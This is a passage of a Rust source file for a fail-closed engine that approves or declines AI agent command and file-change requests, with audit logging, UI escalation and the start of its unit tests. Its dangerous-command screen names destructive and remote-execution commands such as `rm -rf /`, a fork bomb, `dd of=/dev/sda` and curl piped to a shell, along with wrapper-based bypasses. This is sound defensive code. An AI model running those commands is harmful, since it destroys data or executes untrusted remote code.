//! Codex `app-server` approval decision engine (E21 #4870).
//!
//! Drives the FAIL-CLOSED approval workflow: parse a server→client
//! `requestApproval` REQUEST, screen for dangerous commands, resolve the policy
//! verdict, escalate unmatched/confirm-required requests to the UI hook, and
//! audit-log EVERY decision. The transport-level reverse-request plumbing lives
//! in `maekon-network::codex_app_server`; this engine is transport-agnostic (it
//! takes `(method, params)` and returns an [`ApprovalDecision`]) so it can be
//! unit-tested headlessly and wired from the binary crate.
//!
//! Why NOT `PolicyClient::validate_command`: that method is a CRYPTO-TOKEN
//! validator (it parses/verifies a signed `policy_token` carried on an
//! `AutomationCommand`, see `maekon-automation/src/policy/mod.rs:61`). A codex
//! `requestApproval` carries a raw command string, not a token, and
//! `AutomationCommand.action` has no commandExecution/fileChange variant. So the
//! decision is keyed on the policy VERDICT ([`ApprovalPolicyPort`], backed by
//! `get_policy_for_process` + `validate_args` + `ExecutionPolicy.confirmation` +
//! `allow_network`), never on token validation.

use std::sync::Arc;
use std::time::Duration;

use serde_json::Value;

use crate::ports::audit_log::AuditLogPort;
use crate::ports::codex_approval::{
    ApprovalDecision, ApprovalPolicyPort, PolicyVerdict, UiApprovalContext, UiApprovalHook,
    DEFAULT_UI_APPROVAL_TIMEOUT,
};

/// The session id recorded against every approval audit entry. Approvals are
/// per-process (not per maekon command) so a stable synthetic id keeps them
/// filterable in the audit trail.
const APPROVAL_AUDIT_SESSION: &str = "codex_approval";

/// Render-safe summary detail threaded into [`UiApprovalContext`] (E21 #5044).
/// Carries only non-secret summaries — never file contents or secrets.
struct UiRenderDetail {
    process_name: Option<String>,
    args: Vec<String>,
    diff_line_count: Option<usize>,
}

impl UiRenderDetail {
    /// Command approval detail: the program name + its argv tail.
    fn command(process_name: &str, args: &[String]) -> Self {
        Self {
            process_name: Some(process_name.to_string()),
            args: args.to_vec(),
            diff_line_count: None,
        }
    }

    /// File-change approval detail: the diff LINE COUNT only (no diff body).
    fn file_change(line_count: usize) -> Self {
        Self {
            process_name: None,
            args: Vec::new(),
            diff_line_count: Some(line_count),
        }
    }
}

/// The parsed shape of a `requestApproval` request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ApprovalKind {
    /// `item/commandExecution/requestApproval` — a shell/command execution.
    CommandExecution {
        /// The argv (already split into program + args).
        argv: Vec<String>,
        /// The working directory the command would run in (if supplied).
        cwd: Option<String>,
        /// The model's stated reason (if supplied).
        reason: Option<String>,
        /// Whether the request carried a `networkApprovalContext` (the request
        /// wants network access → DEFAULT-DENY unless the policy opts in).
        wants_network: bool,
    },
    /// `item/fileChange/requestApproval` — a unified-diff file edit.
    FileChange {
        /// The unified diff payload.
        diff: String,
        /// Whether the request carried a `networkApprovalContext`.
        wants_network: bool,
    },
}

/// The FAIL-CLOSED approval decision engine. Owns the policy port, the audit
/// sink, and the UI escalation hook (all behind ports so this stays in
/// `maekon-core`).
pub struct CodexApprovalDecider {
    policy: Arc<dyn ApprovalPolicyPort>,
    audit: Arc<dyn AuditLogPort>,
    ui: Arc<dyn UiApprovalHook>,
    ui_timeout: Duration,
}

impl CodexApprovalDecider {
    /// Construct a decider with the default UI escalation timeout.
    pub fn new(
        policy: Arc<dyn ApprovalPolicyPort>,
        audit: Arc<dyn AuditLogPort>,
        ui: Arc<dyn UiApprovalHook>,
    ) -> Self {
        Self {
            policy,
            audit,
            ui,
            ui_timeout: DEFAULT_UI_APPROVAL_TIMEOUT,
        }
    }

    /// Override the UI escalation timeout (default 30s). A UI that does not
    /// answer within this window → decline (fail-closed).
    #[must_use]
    pub fn with_ui_timeout(mut self, timeout: Duration) -> Self {
        self.ui_timeout = timeout;
        self
    }

    /// Decide an approval request, identified by its JSON-RPC `method` +
    /// `params` (and `id`, used only for UI correlation). FAIL-CLOSED: returns
    /// [`ApprovalDecision::Accept`] ONLY from the explicit policy-Auto or
    /// UI-approved branches; EVERY other path (parse error, dangerous command,
    /// no policy match with a deny hook, policy error, Block, network without
    /// opt-in, UI timeout, UI channel drop) returns [`ApprovalDecision::Decline`].
    /// Audits every arm.
    pub async fn decide(&self, id: u64, method: &str, params: &Value) -> ApprovalDecision {
        let kind = match parse_request(method, params) {
            Some(kind) => kind,
            None => {
                self.audit_decline(
                    method,
                    &format!("method={method} reason=unparseable_or_unknown_approval"),
                )
                .await;
                return ApprovalDecision::Decline;
            }
        };

        match &kind {
            ApprovalKind::CommandExecution {
                argv,
                cwd,
                reason,
                wants_network,
            } => {
                self.decide_command(id, argv, cwd.as_deref(), reason.as_deref(), *wants_network)
                    .await
            }
            ApprovalKind::FileChange {
                diff,
                wants_network,
            } => self.decide_file_change(id, diff, *wants_network).await,
        }
    }

    async fn decide_command(
        &self,
        id: u64,
        argv: &[String],
        cwd: Option<&str>,
        reason: Option<&str>,
        wants_network: bool,
    ) -> ApprovalDecision {
        // 1. Dangerous-command screen BEFORE any policy lookup, so even an Auto
        //    policy cannot execute a dangerous command.
        if is_dangerous(argv) {
            self.audit_decline(
                "command",
                &format!(
                    "decision=denied verdict=dangerous process_name={} cwd={} reason={}",
                    argv.first().map(String::as_str).unwrap_or("<empty>"),
                    cwd.unwrap_or("<none>"),
                    reason.unwrap_or("<none>"),
                ),
            )
            .await;
            return ApprovalDecision::Decline;
        }

        let Some((process_name, args)) = argv.split_first() else {
            // Empty argv is not approvable.
            self.audit_decline("command", "decision=denied verdict=empty_argv")
                .await;
            return ApprovalDecision::Decline;
        };

        // 2. Resolve the policy verdict. ANY error → fail-closed decline.
        let verdict = match self.policy.verdict_for(process_name, args).await {
            Ok(verdict) => verdict,
            Err(err) => {
                self.audit_decline(
                    "command",
                    &format!("decision=denied verdict=policy_error process_name={process_name} error={err}"),
                )
                .await;
                return ApprovalDecision::Decline;
            }
        };

        match verdict {
            PolicyVerdict::Auto {
                policy_id,
                allow_network,
            } => {
                // 3. Network DEFAULT-DENY: a network-context request needs an
                //    explicit per-policy opt-in.
                if wants_network && !allow_network {
                    self.audit_decline(
                        "command",
                        &format!(
                            "decision=denied verdict=network_default_deny policy_id={policy_id} process_name={process_name}"
                        ),
                    )
                    .await;
                    return ApprovalDecision::Decline;
                }
                self.audit_accept(
                    "command",
                    &format!(
                        "decision=approved verdict=auto policy_id={policy_id} process_name={process_name} cwd={} reason={}",
                        cwd.unwrap_or("<none>"),
                        reason.unwrap_or("<none>"),
                    ),
                )
                .await;
                ApprovalDecision::Accept
            }
            PolicyVerdict::Confirm { policy_id } => {
                // Network DEFAULT-DENY is airtight: a network-context request is
                // declined under a Confirm policy too (the only network opt-in in
                // this slice is an Auto policy with allow_network==true; UI
                // approval does NOT grant network — that needs the FU-A modal's
                // network panel + an explicit per-request grant).
                if wants_network {
                    self.audit_decline(
                        "command",
                        &format!(
                            "decision=denied verdict=network_default_deny_confirm policy_id={policy_id} process_name={process_name}"
                        ),
                    )
                    .await;
                    return ApprovalDecision::Decline;
                }
                self.escalate_to_ui(
                    id,
                    "command",
                    &format!("command: {}", argv.join(" ")),
                    UiRenderDetail::command(process_name, args),
                    &format!("verdict=confirm policy_id={policy_id} process_name={process_name}"),
                )
                .await
            }
            PolicyVerdict::Block { policy_id } => {
                self.audit_decline(
                    "command",
                    &format!("decision=denied verdict=block policy_id={policy_id} process_name={process_name}"),
                )
                .await;
                ApprovalDecision::Decline
            }
            PolicyVerdict::NoMatch => {
                self.escalate_to_ui(
                    id,
                    "command",
                    &format!("command: {}", argv.join(" ")),
                    UiRenderDetail::command(process_name, args),
                    &format!("verdict=no_match process_name={process_name}"),
                )
                .await
            }
        }
    }

    async fn decide_file_change(
        &self,
        id: u64,
        diff: &str,
        wants_network: bool,
    ) -> ApprovalDecision {
        // Network DEFAULT-DENY also applies to file-change requests.
        if wants_network {
            self.audit_decline(
                "file_change",
                "decision=denied verdict=network_default_deny_file_change",
            )
            .await;
            return ApprovalDecision::Decline;
        }
        // File-change approvals have no process to key a policy on, so they
        // always escalate to the UI (fail-closed under the default deny hook).
        // The diff is summarized to a line count to avoid logging file contents.
        let line_count = diff.lines().count();
        self.escalate_to_ui(
            id,
            "file_change",
            &format!("file change ({line_count} diff lines)"),
            UiRenderDetail::file_change(line_count),
            &format!("verdict=file_change diff_lines={line_count}"),
        )
        .await
    }

    /// Escalate to the UI hook with a bounded timeout. The hook's oneshot
    /// resolving `true` → Accept; `false` / timeout / channel-drop → Decline.
    ///
    /// `detail` carries the render-SAFE summary fields (process name + argv
    /// tail, or diff line count) threaded into the [`UiApprovalContext`] so the
    /// FU-A modal (#5044) can render command/file context. The decision payload
    /// remains verdict-only — `detail` never reaches the wire response.
    async fn escalate_to_ui(
        &self,
        id: u64,
        kind_tag: &str,
        summary: &str,
        detail: UiRenderDetail,
        verdict_detail: &str,
    ) -> ApprovalDecision {
        let ctx = UiApprovalContext {
            request_id: id,
            summary: summary.to_string(),
            kind: kind_tag.to_string(),
            process_name: detail.process_name,
            args: detail.args,
            diff_line_count: detail.diff_line_count,
            // Network is DEFAULT-DENY before escalation, so UI approval never
            // grants network in this slice (kept None; forward-compat field).
            network_host: None,
        };
        let rx = self.ui.request_approval(ctx).await;
        match tokio::time::timeout(self.ui_timeout, rx).await {
            Ok(Ok(true)) => {
                self.audit_accept(
                    kind_tag,
                    &format!("decision=approved source=ui {verdict_detail}"),
                )
                .await;
                ApprovalDecision::Accept
            }
            Ok(Ok(false)) => {
                self.audit_decline(
                    kind_tag,
                    &format!("decision=denied source=ui {verdict_detail}"),
                )
                .await;
                ApprovalDecision::Decline
            }
            Ok(Err(_dropped)) => {
                self.audit_decline(
                    kind_tag,
                    &format!("decision=denied source=ui_channel_dropped {verdict_detail}"),
                )
                .await;
                ApprovalDecision::Decline
            }
            Err(_elapsed) => {
                // UI timeout → decline (fail-closed). Logged distinctly via
                // log_event so a Timeout-shaped audit trail is queryable.
                self.audit
                    .log_event(
                        "codex.approval.timeout",
                        APPROVAL_AUDIT_SESSION,
                        &format!(
                            "decision=denied source=ui_timeout timeout_ms={} {verdict_detail}",
                            self.ui_timeout.as_millis()
                        ),
                    )
                    .await;
                ApprovalDecision::Decline
            }
        }
    }

    async fn audit_accept(&self, kind_tag: &str, details: &str) {
        self.audit
            .log_event(
                &format!("codex.approval.{kind_tag}.approved"),
                APPROVAL_AUDIT_SESSION,
                details,
            )
            .await;
    }

    async fn audit_decline(&self, kind_tag: &str, details: &str) {
        self.audit
            .log_event(
                &format!("codex.approval.{kind_tag}.denied"),
                APPROVAL_AUDIT_SESSION,
                details,
            )
            .await;
    }
}

/// Parse a `requestApproval` request into an [`ApprovalKind`]. Defensive about
/// the preview/unstable app-server schema (R1/R4): accepts both the
/// `item/commandExecution/requestApproval` and the shorter
/// `commandExecution/approvalRequest` / `*/approvalRequest` spellings, reads the
/// command as either a string (`command`/`call`) or an argv array (`argv`/
/// `command`), and treats any `networkApprovalContext` presence as a network
/// request. Returns `None` on an unknown method or unparseable command →
/// FAIL-CLOSED decline by the caller.
pub fn parse_request(method: &str, params: &Value) -> Option<ApprovalKind> {
    let wants_network = params.get("networkApprovalContext").is_some()
        || params.get("network_approval_context").is_some();

    if is_command_approval(method) {
        let argv = parse_argv(params)?;
        if argv.is_empty() {
            return None;
        }
        let cwd = params
            .get("cwd")
            .and_then(Value::as_str)
            .map(str::to_string);
        let reason = params
            .get("reason")
            .and_then(Value::as_str)
            .map(str::to_string);
        return Some(ApprovalKind::CommandExecution {
            argv,
            cwd,
            reason,
            wants_network,
        });
    }

    if is_file_change_approval(method) {
        let diff = params
            .get("diff")
            .or_else(|| params.get("unifiedDiff"))
            .or_else(|| params.get("unified_diff"))
            .and_then(Value::as_str)
            .unwrap_or("")
            .to_string();
        return Some(ApprovalKind::FileChange {
            diff,
            wants_network,
        });
    }

    None
}

/// Does this method name denote a command-execution approval request?
fn is_command_approval(method: &str) -> bool {
    let m = method.to_ascii_lowercase();
    m.contains("commandexecution")
        && (m.contains("requestapproval") || m.contains("approvalrequest"))
}

/// Does this method name denote a file-change approval request?
fn is_file_change_approval(method: &str) -> bool {
    let m = method.to_ascii_lowercase();
    m.contains("filechange") && (m.contains("requestapproval") || m.contains("approvalrequest"))
}

/// Extract the command argv from params, accepting either a single command
/// string (split on whitespace) or an explicit argv array.
fn parse_argv(params: &Value) -> Option<Vec<String>> {
    // Explicit argv array takes precedence.
    if let Some(arr) = params
        .get("argv")
        .or_else(|| params.get("command").filter(|v| v.is_array()))
        .and_then(Value::as_array)
    {
        let argv: Vec<String> = arr
            .iter()
            .filter_map(Value::as_str)
            .map(str::to_string)
            .collect();
        return Some(argv);
    }

    // Otherwise a command string at command / call / cmd.
    let cmd = params
        .get("command")
        .or_else(|| params.get("call"))
        .or_else(|| params.get("cmd"))
        .and_then(Value::as_str)?;
    Some(shell_split(cmd))
}

/// Minimal whitespace shell-split (no quote *tokenization* — a full shlex
/// tokenizer is intentionally out of scope). Quoting IS security-relevant for
/// the dangerous screen: a quoted target such as `rm -rf "/"` would otherwise
/// slip past both the token-equality and substring checks. `is_dangerous`
/// therefore normalizes quote characters out of every token and out of the
/// joined command before screening, so this coarse split is safe for that gate.
fn shell_split(cmd: &str) -> Vec<String> {
    cmd.split_whitespace().map(str::to_string).collect()
}

/// Strip a single matched pair of surrounding quote characters (`'` or `"`)
/// from a token, e.g. `"/"` → `/` and `'build/'` → `build/`. Only an outermost
/// matching pair is removed; embedded quotes are handled by the joined-string
/// normalization in `is_dangerous`. Cross-platform (pure string handling).
fn strip_surrounding_quotes(token: &str) -> &str {
    let bytes = token.as_bytes();
    if bytes.len() >= 2 {
        let first = bytes[0];
        let last = bytes[bytes.len() - 1];
        if (first == b'"' || first == b'\'') && first == last {
            return &token[1..token.len() - 1];
        }
    }
    token
}

/// Maximum recursion depth when unwrapping nested command wrappers (e.g.
/// `sudo bash -c "sh -c '...'"`). A small cap is enough for any legitimate
/// command and prevents a crafted, deeply-nested wrapper from blowing the stack
/// or starving the gate. Once the cap is hit we still screen the wrapper's own
/// argv (program-gated + joined checks), we just stop re-tokenizing deeper.
const MAX_WRAPPER_DEPTH: usize = 3;

/// Shell interpreters whose `-c`-family argument carries an embedded command
/// line. When the program is one of these AND a command-flag is present, the
/// script string is re-tokenized and screened recursively, so a destructive
/// command hidden inside a wrapper (e.g. `bash -lc "rm -rf /"`) cannot bypass
/// the program-gated checks below (which would otherwise see `program=="bash"`).
const SHELL_INTERPRETERS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "fish"];

/// Execution wrappers whose trailing argv is another command. These wrappers
/// are not dangerous by themselves, but they can hide the real program from the
/// program-gated rules below (`sudo rm -rf /`, `env rm -rf /`, `timeout 5 rm …`).
const EXEC_WRAPPERS: &[&str] = &[
    "sudo", "doas", "env", "nice", "timeout", "nohup", "xargs", "stdbuf", "setsid",
];

fn program_basename_lower(token: &str) -> String {
    token
        .rsplit('/')
        .next()
        .unwrap_or(token)
        .to_ascii_lowercase()
}

fn env_assignment(token: &str) -> bool {
    let Some((name, _)) = token.split_once('=') else {
        return false;
    };
    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn option_takes_value(token: &str, short: &[char], long: &[&str]) -> bool {
    if token.starts_with("--") {
        let option = token.split_once('=').map(|(name, _)| name).unwrap_or(token);
        return long.contains(&option);
    }
    if token.len() < 2 || !token.starts_with('-') || token == "-" {
        return false;
    }
    let mut chars = token[1..].chars();
    let Some(flag) = chars.next() else {
        return false;
    };
    short.contains(&flag)
}

fn skip_wrapper_options(
    norm: &[String],
    mut idx: usize,
    short_value_options: &[char],
    long_value_options: &[&str],
) -> usize {
    while idx < norm.len() {
        let arg = norm[idx].as_str();
        if arg == "--" {
            return idx + 1;
        }
        if !arg.starts_with('-') || arg == "-" {
            break;
        }
        let takes_separate_value = option_takes_value(arg, short_value_options, long_value_options)
            && !arg.contains('=')
            && (arg.len() == 2 || arg.starts_with("--"));
        idx += 1;
        if takes_separate_value && idx < norm.len() {
            idx += 1;
        }
    }
    idx
}

fn payload_from(norm: &[String], idx: usize) -> Option<Vec<String>> {
    (idx < norm.len()).then(|| norm[idx..].to_vec())
}

fn env_wrapper_payload(norm: &[String]) -> Option<Vec<String>> {
    let mut idx = 1;
    while idx < norm.len() {
        let arg = norm[idx].as_str();
        if arg == "--" {
            return payload_from(norm, idx + 1);
        }
        if arg == "-S" || arg == "--split-string" {
            if idx + 1 >= norm.len() {
                return None;
            }
            let script = norm[idx + 1..].join(" ");
            return Some(shell_split(strip_surrounding_quotes(&script)));
        }
        if let Some(script) = arg.strip_prefix("--split-string=") {
            return Some(shell_split(strip_surrounding_quotes(script)));
        }
        if env_assignment(arg) {
            idx += 1;
            continue;
        }
        if arg.starts_with('-') && arg != "-" {
            let takes_separate_value =
                option_takes_value(arg, &['u', 'C'], &["--unset", "--chdir"])
                    && !arg.contains('=')
                    && (arg.len() == 2 || arg.starts_with("--"));
            idx += 1;
            if takes_separate_value && idx < norm.len() {
                idx += 1;
            }
            continue;
        }
        return payload_from(norm, idx);
    }
    None
}

fn exec_wrapper_payload(norm: &[String]) -> Option<Vec<String>> {
    if norm.len() < 2 {
        return None;
    }
    let wrapper = program_basename_lower(&norm[0]);
    if !EXEC_WRAPPERS.contains(&wrapper.as_str()) {
        return None;
    }
    match wrapper.as_str() {
        "sudo" | "doas" => {
            let idx = skip_wrapper_options(
                norm,
                1,
                &['u', 'g', 'h', 'p', 'C', 'D', 'r', 't', 'U', 'T'],
                &[
                    "--user",
                    "--group",
                    "--host",
                    "--prompt",
                    "--chdir",
                    "--role",
                    "--type",
                    "--other-user",
                    "--command-timeout",
                ],
            );
            payload_from(norm, idx)
        }
        "env" => env_wrapper_payload(norm),
        "nice" => {
            let idx = skip_wrapper_options(norm, 1, &['n'], &["--adjustment"]);
            payload_from(norm, idx)
        }
        "timeout" => {
            let duration_idx =
                skip_wrapper_options(norm, 1, &['k', 's'], &["--kill-after", "--signal"]);
            payload_from(norm, duration_idx + 1)
        }
        "nohup" => payload_from(norm, 1),
        "xargs" => {
            let idx = skip_wrapper_options(
                norm,
                1,
                &['a', 'd', 'E', 'e', 'I', 'i', 'L', 'l', 'n', 'P', 's'],
                &[
                    "--arg-file",
                    "--delimiter",
                    "--eof",
                    "--replace",
                    "--max-lines",
                    "--max-args",
                    "--max-procs",
                    "--max-chars",
                ],
            );
            payload_from(norm, idx)
        }
        "stdbuf" => {
            let idx = skip_wrapper_options(
                norm,
                1,
                &['i', 'o', 'e'],
                &["--input", "--output", "--error"],
            );
            payload_from(norm, idx)
        }
        "setsid" => {
            let idx = skip_wrapper_options(norm, 1, &[], &[]);
            payload_from(norm, idx)
        }
        _ => None,
    }
}

/// Flags that introduce an inline command string for a shell interpreter. We
/// match the canonical `-c` plus the common combined short forms (`-lc`, `-ic`,
/// `-ec`, …) and the GNU long form `--command`. Any single-dash bundle that
/// contains a `c` is treated as command-bearing so reordered combos still hit.
fn is_command_flag(flag: &str) -> bool {
    if flag == "--command" {
        return true;
    }
    // Single-dash short bundle (e.g. `-c`, `-lc`, `-ic`, `-ec`) — but not a
    // long `--…` option. The bundle is command-bearing iff it includes `c`.
    flag.len() >= 2
        && flag.starts_with('-')
        && !flag.starts_with("--")
        && flag[1..].chars().all(|c| c.is_ascii_alphabetic())
        && flag[1..].contains('c')
}

/// True iff `token` is a single-dash short-flag bundle (e.g. `-rf`, `-Rv`) whose
/// letters include `needle` (case-insensitive). Excludes long `--…` options and
/// `key=value` style args. Used to aggregate `rm` recursion/force flags that the
/// user may have split or reordered (`-r -f`, `-fr`, `-R --force`, …).
fn short_bundle_has(token: &str, needle: char) -> bool {
    token.len() >= 2
        && token.starts_with('-')
        && !token.starts_with("--")
        && token[1..].chars().all(|c| c.is_ascii_alphabetic())
        && token[1..].chars().any(|c| c.eq_ignore_ascii_case(&needle))
}

/// Static dangerous-command screen on the parsed argv (and the joined form). A
/// match → decline BEFORE policy lookup, so even an Auto policy cannot run it.
/// Conservative substring/heuristic matching: false positives here only cause a
/// (safe) decline, never an unsafe accept.
pub fn is_dangerous(argv: &[String]) -> bool {
    is_dangerous_inner(argv, 0)
}

/// Depth-tracked core of [`is_dangerous`]. `depth` counts how many shell-wrapper
/// layers we have already unwrapped; it is capped at [`MAX_WRAPPER_DEPTH`] to
/// avoid unbounded recursion on crafted nested wrappers.
fn is_dangerous_inner(argv: &[String], depth: usize) -> bool {
    if argv.is_empty() {
        return false;
    }
    // Normalize quoting before screening: surrounding quotes are stripped from
    // every token, and ALL quote characters are removed from the joined form, so
    // that a quoted destructive target (e.g. `rm -rf "/"`) cannot slip past the
    // token-equality or substring checks below. Without this, argv would contain
    // the literal token `"/"` (token checks miss) and the joined string would be
    // `rm -rf "/"` (the quotes break the `rm -rf /` substring). This gate must
    // fail closed, so we screen on the normalized forms.
    let norm: Vec<String> = argv
        .iter()
        .map(|a| strip_surrounding_quotes(a).to_string())
        .collect();
    let program = program_basename_lower(&norm[0]);
    let joined = norm.join(" ").replace(['"', '\''], "").to_ascii_lowercase();

    // Exec-wrapper prefix unwrap (#7482): `sudo`, `env`, `timeout`, `nice`,
    // `xargs`, and siblings can put the real program after wrapper flags. The
    // destructive rules below are program-gated, so they must see the payload
    // command rather than the wrapper program.
    if depth < MAX_WRAPPER_DEPTH {
        if let Some(inner) = exec_wrapper_payload(&norm) {
            if is_dangerous_inner(&inner, depth + 1) {
                return true;
            }
        }
    }

    // Shell-interpreter wrapper unwrap (#6166): a destructive command can hide
    // inside `bash -lc "rm -rf /"` / `sh -c "dd if=/dev/zero of=/dev/sda"`. The
    // program-gated checks below see `program=="bash"`/`"sh"` and skip the
    // `rm`/`dd`/`mkfs` rules, so we must re-tokenize the inline script string and
    // screen it on its own. Re-tokenize via the same coarse `shell_split` and
    // recurse (depth-capped) so quote normalization and every rule re-apply.
    if depth < MAX_WRAPPER_DEPTH && SHELL_INTERPRETERS.contains(&program.as_str()) {
        // Find the first command-bearing flag, then treat EVERYTHING after it as
        // the inline script. We must join the remaining tokens rather than take
        // just the next one, because a command STRING (e.g. `bash -lc "rm -rf /"`)
        // has already been coarsely whitespace-split upstream into
        // `["bash","-lc","\"rm","-rf","/\""]` — the script is spread across
        // tokens. Re-joining, stripping the outer quote pair, and re-splitting
        // via `shell_split` reconstructs the inner argv for a recursive
        // (depth-capped) screen, so quote normalization and every rule re-apply.
        if let Some(flag_idx) = norm[1..].iter().position(|a| is_command_flag(a)) {
            let script_start = flag_idx + 2; // +1 for the [1..] offset, +1 for next.
            if script_start < argv.len() {
                let script = argv[script_start..].join(" ");
                let inner = shell_split(strip_surrounding_quotes(&script));
                if is_dangerous_inner(&inner, depth + 1) {
                    return true;
                }
            }
        }
    }

    // rm targeting / or a root-ish path, with recursion + force.
    if program == "rm" {
        // Aggregate the recursion and force flags ACROSS ALL tokens (#6167):
        // `rm -r -f /`, `rm -f -r /`, `rm --recursive -f /`, `rm -R -f /` must
        // all flag, not just the contiguous `-rf`/`-fr` bundle. A per-token
        // predicate (one token holding both letters) misses every split form.
        let recursive = norm.iter().any(|a| {
            let a = a.to_ascii_lowercase();
            a == "-r" || a == "--recursive" || short_bundle_has(&a, 'r')
        });
        let force = norm.iter().any(|a| {
            let a = a.to_ascii_lowercase();
            a == "--force" || short_bundle_has(&a, 'f')
        });
        let targets_root = norm
            .iter()
            .any(|a| a == "/" || a == "/*" || a == "~" || a == "~/" || a.starts_with("/."));
        if recursive && force && targets_root {
            return true;
        }
        // Be conservative: any `rm -rf /...` literal (contiguous-bundle form).
        if joined.contains("rm -rf /") || joined.contains("rm -fr /") {
            return true;
        }
    }

    // Fork bomb `:(){ :|:& };:` and common variants.
    if joined.contains(":(){") || joined.replace(' ', "").contains(":(){:|:&};:") {
        return true;
    }

    // Filesystem-destroying tools.
    if program == "mkfs" || program.starts_with("mkfs.") {
        return true;
    }
    if program == "dd" && joined.contains("of=/dev/") {
        return true;
    }

    // Pipe-to-shell remote execution (curl|sh / wget|bash).
    let pipes_to_shell = (joined.contains("curl") || joined.contains("wget"))
        && (joined.contains("| sh")
            || joined.contains("|sh")
            || joined.contains("| bash")
            || joined.contains("|bash"));
    if pipes_to_shell {
        return true;
    }

    // Overwriting a block device.
    if joined.contains("> /dev/sd") || joined.contains(">/dev/sd") {
        return true;
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::audit::{AuditEntry, AuditLevel, AuditStats, AuditStatus};
    use async_trait::async_trait;
    use std::sync::Mutex;
    use tokio::sync::oneshot;

    // ── manual mocks (no mockall, ADR-001 §5) ──

    /// An audit sink that records every event for assertions.
    #[derive(Default)]
    struct RecordingAudit {
        events: Mutex<Vec<(String, String)>>, // (action_type, details)
    }

    #[async_trait]
    impl AuditLogPort for RecordingAudit {
        async fn pending_count(&self) -> usize {
            self.events.lock().unwrap().len()
        }
        async fn recent_entries(&self, _limit: usize) -> Vec<AuditEntry> {
            Vec::new()
        }
        async fn entries_by_status(&self, _status: &AuditStatus, _limit: usize) -> Vec<AuditEntry> {
            Vec::new()
        }
        async fn entries_by_action_prefix(&self, _prefix: &str, _limit: usize) -> Vec<AuditEntry> {
            Vec::new()
        }
        async fn stats(&self) -> AuditStats {
            AuditStats {
                total: 0,
                completed: 0,
                failed: 0,
                denied: 0,
                timeout: 0,
            }
        }
        async fn has_pending_batch(&self) -> bool {
            false
        }
        async fn log_event(&self, action_type: &str, _session_id: &str, details: &str) {
            self.events
                .lock()
                .unwrap()
                .push((action_type.to_string(), details.to_string()));
        }
        async fn log_start_if(&self, _l: AuditLevel, _c: &str, _s: &str, _a: &str) {}
        async fn log_complete_with_time(
            &self,
            _l: AuditLevel,
            _c: &str,
            _s: &str,
            _d: &str,
            _e: u64,
        ) {
        }
        async fn drain_batch(&self) -> Vec<AuditEntry> {
            Vec::new()
        }
        async fn drain_all(&self) -> Vec<AuditEntry> {
            Vec::new()
        }
        async fn entries_by_command_id(&self, _command_id: &str, _limit: usize) -> Vec<AuditEntry> {
            Vec::new()
        }
    }

    impl RecordingAudit {
        fn last(&self) -> (String, String) {
            self.events.lock().unwrap().last().cloned().unwrap()
        }
        fn count(&self) -> usize {
            self.events.lock().unwrap().len()
        }
    }

    /// A policy port returning a fixed verdict (or error).
    struct FixedPolicy(Result<PolicyVerdict, String>);
    #[async_trait]
    impl ApprovalPolicyPort for FixedPolicy {
        async fn verdict_for(&self, _p: &str, _a: &[String]) -> Result<PolicyVerdict, String> {
            self.0.clone()
        }
    }

    /// A UI hook that records whether it was called and returns a fixed answer.
    struct RecordingUiHook {
        called: Mutex<bool>,
        answer: bool,
    }
    #[async_trait]
    impl UiApprovalHook for RecordingUiHook {
        async fn request_approval(&self, _ctx: UiApprovalContext) -> oneshot::Receiver<bool> {
            *self.called.lock().unwrap() = true;
            let (tx, rx) = oneshot::channel();
            let _ = tx.send(self.answer);
            rx
        }
    }

    /// A UI hook that captures the `UiApprovalContext` it was handed (so a test
    /// can assert the render-safe detail fields were threaded through), then
    /// resolves to a fixed answer.
    struct CapturingUiHook {
        captured: Mutex<Option<UiApprovalContext>>,
        answer: bool,
    }
    #[async_trait]
    impl UiApprovalHook for CapturingUiHook {
        async fn request_approval(&self, ctx: UiApprovalContext) -> oneshot::Receiver<bool> {
            *self.captured.lock().unwrap() = Some(ctx);
            let (tx, rx) = oneshot::channel();
            let _ = tx.send(self.answer);
            rx
        }
    }

    /// A UI hook that never resolves (drops the sender after the timeout window).
    struct NeverResolvingHook;
    #[async_trait]
    impl UiApprovalHook for NeverResolvingHook {
        async fn request_approval(&self, _ctx: UiApprovalContext) -> oneshot::Receiver<bool> {
            let (_tx, rx) = oneshot::channel();
            // Leak tx so the channel stays open but never resolves → timeout.
            std::mem::forget(_tx);
            rx
        }
    }

    /// A UI hook that immediately drops the sender (channel closed).
    struct DropSenderHook;
    #[async_trait]
    impl UiApprovalHook for DropSenderHook {
        async fn request_approval(&self, _ctx: UiApprovalContext) -> oneshot::Receiver<bool> {
            let (_tx, rx) = oneshot::channel::<bool>();
            // _tx dropped here → rx resolves to Err.
            rx
        }
    }

    fn decider(
        policy: PolicyVerdict,
        audit: Arc<RecordingAudit>,
        ui: Arc<dyn UiApprovalHook>,
    ) -> CodexApprovalDecider {
        CodexApprovalDecider::new(Arc::new(FixedPolicy(Ok(policy))), audit, ui)
    }

    fn cmd_params(command: &str) -> Value {
        serde_json::json!({ "command": command, "cwd": "/tmp", "reason": "test" })
    }

    use crate::ports::codex_approval::DefaultDenyUiHook;

    // ── parse_request ──

    #[test]
    fn parse_command_execution_string_command() {
        let kind = parse_request(
            "item/commandExecution/requestApproval",
            &cmd_params("git status"),
        )
        .unwrap();
        match kind {
            ApprovalKind::CommandExecution {
                argv,
                cwd,
                reason,
                wants_network,
            } => {
                assert_eq!(argv, vec!["git", "status"]);
                assert_eq!(cwd.as_deref(), Some("/tmp"));
                assert_eq!(reason.as_deref(), Some("test"));
                assert!(!wants_network);
            }
            other => panic!("expected CommandExecution, got {other:?}"),
        }
    }

    #[test]
    fn parse_accepts_short_method_spelling_and_argv_array() {
        let kind = parse_request(
            "commandExecution/approvalRequest",
            &serde_json::json!({ "argv": ["ls", "-la"] }),
        )
        .unwrap();
        assert!(matches!(
            kind,
            ApprovalKind::CommandExecution { argv, .. } if argv == vec!["ls", "-la"]
        ));
    }

    #[test]
    fn parse_file_change() {
        let kind = parse_request(
            "item/fileChange/requestApproval",
            &serde_json::json!({ "diff": "--- a\n+++ b\n" }),
        )
        .unwrap();
        assert!(matches!(kind, ApprovalKind::FileChange { .. }));
    }

    #[test]
    fn parse_unknown_method_is_none() {
        assert!(parse_request("turn/completed", &serde_json::json!({})).is_none());
    }

    #[test]
    fn parse_network_context_flag() {
        let kind = parse_request(
            "item/commandExecution/requestApproval",
